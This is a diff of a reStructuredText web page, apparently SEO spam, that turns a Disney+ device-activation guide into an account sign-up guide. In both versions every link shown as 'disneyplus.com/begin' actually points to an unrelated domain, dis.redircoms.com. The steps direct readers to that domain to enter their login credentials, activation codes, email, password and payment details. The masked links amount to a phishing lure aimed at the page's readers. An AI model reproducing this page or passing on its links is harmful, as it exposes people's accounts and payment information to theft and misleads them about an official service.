@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Create a Disney Plus Account?
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
 
 .. image:: blank.png
    :width: 350px
@@ -22,27 +22,33 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Creating a Disney Plus account is the first step to unlocking a world of entertainment, including Marvel, Star Wars, Pixar, and more. Visit `disneyplus.com/begin <https://dis.redircoms.com>`_ to get started in just a few steps.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Create a Disney+ Account
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Open a web browser on your computer or mobile device.
+2. Go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
+3. Click on **Sign Up Now** or **Get Started**.
+4. Enter your **email address** and choose a secure **password**.
+5. Select a subscription plan (monthly or annual).
+6. Enter your **payment information** and confirm the details.
+7. Click **Agree & Subscribe** to complete your account setup.
 
 **********
-What to Do After Activation
+What You Get with a Disney+ Account
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- Access to Disney, Pixar, Marvel, Star Wars, and National Geographic content.
+- Stream on multiple devices simultaneously.
+- Option to create separate user profiles for family members.
+- Download shows and movies for offline viewing.
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Need to Activate on a Device?
+**********
+
+Once your account is created, use `disneyplus.com/begin <https://dis.redircoms.com>`_ on a second device to enter your **activation code** and link your Smart TV or streaming device.
+
+Start your Disney+ experience by creating an account today at `disneyplus.com/begin <https://dis.redircoms.com>`_ and enjoy unlimited streaming at your fingertips.
